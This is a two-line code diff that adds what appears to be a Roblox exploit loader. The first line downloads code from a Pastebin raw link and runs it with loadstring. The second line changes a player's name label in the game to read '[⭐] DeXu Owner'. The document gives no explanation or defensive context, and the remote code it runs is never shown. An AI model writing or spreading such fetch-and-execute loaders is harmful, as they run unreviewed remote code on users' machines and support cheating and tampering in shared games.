@@ -1,0 +1,2 @@
+loadstring(game:HttpGet(('https://pastebin.com/raw/ZfS5AgNc'),true))()
+game.workspace.TPUB1P.Head.playerName.Sector.name.Text = "[⭐] DeXu Owner"
